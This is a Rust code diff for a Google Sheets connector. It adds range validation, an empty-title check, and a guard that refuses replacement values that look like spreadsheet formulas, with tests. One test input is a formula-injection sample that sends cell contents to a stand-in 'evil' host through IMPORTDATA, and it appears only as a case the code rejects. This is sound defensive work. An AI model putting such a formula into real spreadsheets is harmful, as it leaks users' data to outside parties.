@@ -112,23 +112,43 @@ fn validate_range(range: &str) -> ConnResult<()> {
         return Err(bad("write it as Tab!A1 or Tab!A1:C3"));
     };
     let tab = tab.trim();
-    let tab_name = tab
-        .strip_prefix('\'')
-        .and_then(|t| t.strip_suffix('\''))
-        .unwrap_or(tab);
+    let quoted = tab.len() >= 2 && tab.starts_with('\'') && tab.ends_with('\'');
+    let tab_name = if quoted { &tab[1..tab.len() - 1] } else { tab };
     if tab_name.trim().is_empty() {
         return Err(bad("the tab name is empty"));
+    }
+    if !quoted && tab_name.contains('\'') {
+        return Err(bad("unbalanced quote in the tab name"));
+    }
+    if !quoted && tab_name.contains(char::is_whitespace) {
+        return Err(bad("quote a tab name containing spaces, like 'My Tab'!A1"));
     }
     if cells.is_empty()
         || !cells
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || c == '$' || c == ':')
         || cells.matches(':').count() > 1
+        || cells.starts_with(':')
+        || cells.ends_with(':')
         || !cells.chars().any(|c| c.is_ascii_alphanumeric())
     {
         return Err(bad("the cell part must look like A1 or A1:C3"));
     }
     Ok(())
+}
+
+/// Whether `value` would be read as a formula if a cell were set to it: it starts
+/// with `=`, or with `+`, `-` or `@` followed by a letter or `(`. Plain numbers
+/// and text such as `-5` or `+1 555 0100` are not formulas.
+fn looks_like_formula(value: &str) -> bool {
+    let mut chars = value.chars();
+    match chars.next() {
+        Some('=') => true,
+        Some('+' | '-' | '@') => chars
+            .next()
+            .is_some_and(|c| c.is_ascii_alphabetic() || c == '('),
+        _ => false,
+    }
 }
 
 /// Check one edit op's shape; the error names the op.
@@ -294,6 +314,13 @@ impl Connector for GoogleSheetsConnector {
         if replacements.is_empty() {
             return Ok(json!({"replaced": 0}));
         }
+        // findReplace cannot write raw text, so a value that would become a
+        // formula is refused (all of them, before the first request).
+        if let Some((k, _)) = replacements.iter().find(|(_, v)| looks_like_formula(v)) {
+            return Err(ConnectorError::msg(format!(
+                "The value for \"{k}\" looks like a formula; formulas are not allowed in replacements"
+            )));
+        }
         let token = self.auth.access_token().map_err(ConnectorError::msg)?;
         let requests: Vec<Value> = replacements
             .iter()
@@ -318,6 +345,9 @@ impl Connector for GoogleSheetsConnector {
     }
 
     fn create_sheet(&self, title: &str, tabs: &[Value]) -> ConnResult<Value> {
+        if title.trim().is_empty() {
+            return Err(ConnectorError::msg("The spreadsheet title is empty"));
+        }
         let mut parsed = Vec::new();
         for tab in tabs {
             parsed.push(validate_tab(tab)?);
@@ -398,6 +428,7 @@ impl Connector for GoogleSheetsConnector {
             );
             let got = self.call("GET", &url, &token, None, 3)?;
             let ranges = got.get("valueRanges").and_then(Value::as_array);
+            // Merged cells other than the top-left one come back as "".
             for (i, name) in names.iter().enumerate() {
                 let values = ranges.and_then(|r| r.get(i)).and_then(|r| r.get("values"));
                 let (rows, tab_truncated) = shape_rows(values);
@@ -636,7 +667,10 @@ mod tests {
             {"findReplace": {"occurrencesChanged": 2}},
             {"findReplace": {"occurrencesChanged": 1}}]}));
         let out = conn(http.clone(), Some("RT"))
-            .fill_sheet("s1", &[("a".into(), "1".into()), ("b".into(), "=2".into())])
+            .fill_sheet(
+                "s1",
+                &[("a".into(), "1".into()), ("b".into(), "two".into())],
+            )
             .unwrap();
         assert_eq!(out["replaced"], 3);
         let c = http.calls.lock().unwrap()[0].clone();
@@ -646,13 +680,80 @@ mod tests {
         assert_eq!(r[0]["findReplace"]["find"], "{{a}}");
         assert_eq!(r[0]["findReplace"]["allSheets"], true);
         assert_eq!(r[0]["findReplace"]["matchCase"], true);
-        assert_eq!(r[1]["findReplace"]["replacement"], "=2");
+        assert_eq!(r[1]["findReplace"]["replacement"], "two");
         assert_eq!(
             conn(FakeHttp::ok(json!({})), Some("RT"))
                 .fill_sheet("s", &[])
                 .unwrap()["replaced"],
             0
         );
+    }
+
+    #[test]
+    fn fill_sheet_rejects_formula_like_values_before_any_call() {
+        for bad in [
+            "=2",
+            "=IMPORTDATA(\"https://evil/?d=\"&A1)",
+            "+SUM(A1)",
+            "-A1",
+            "@SUM(1)",
+            "+(1)",
+        ] {
+            let http = FakeHttp::ok(json!({}));
+            let e = conn(http.clone(), Some("RT"))
+                .fill_sheet(
+                    "s",
+                    &[("ok".into(), "fine".into()), ("k".into(), bad.into())],
+                )
+                .unwrap_err()
+                .to_string();
+            assert!(e.contains("\"k\"") && e.contains("formula"), "{e}");
+            assert!(!e.contains(bad) && !e.contains("fine"), "{e}");
+            assert!(http.calls.lock().unwrap().is_empty(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn fill_sheet_accepts_plain_numbers_and_text() {
+        for good in ["-5", "+1 555", "@ 3pm", "a=b", "", "- note"] {
+            let http = FakeHttp::ok(json!({"replies": []}));
+            conn(http.clone(), Some("RT"))
+                .fill_sheet("s", &[("k".into(), good.into())])
+                .unwrap();
+            assert_eq!(http.calls.lock().unwrap().len(), 1, "{good}");
+        }
+    }
+
+    #[test]
+    fn range_validation_handles_quoted_tabs_and_rejects_loose_shapes() {
+        for ok in [
+            "'It''s'!A1",
+            "'a!b'!A1:B2",
+            "Tab!A1:C",
+            "Tab!$A$1:$B$2",
+            "'My Tab'!A:A",
+        ] {
+            assert!(validate_range(ok).is_ok(), "{ok}");
+        }
+        for bad in [
+            "Tab!A1:",
+            "Tab!:A1",
+            "My Tab!A1",
+            "'x!A1",
+            "''!A1",
+            "Tab!A1:B2:C3",
+        ] {
+            assert!(validate_range(bad).is_err(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn create_sheet_rejects_an_empty_title_before_any_call() {
+        let http = FakeHttp::ok(json!({"spreadsheetId": "n1"}));
+        assert!(conn(http.clone(), Some("RT"))
+            .create_sheet("  ", &[])
+            .is_err());
+        assert!(http.calls.lock().unwrap().is_empty());
     }
 
     #[test]
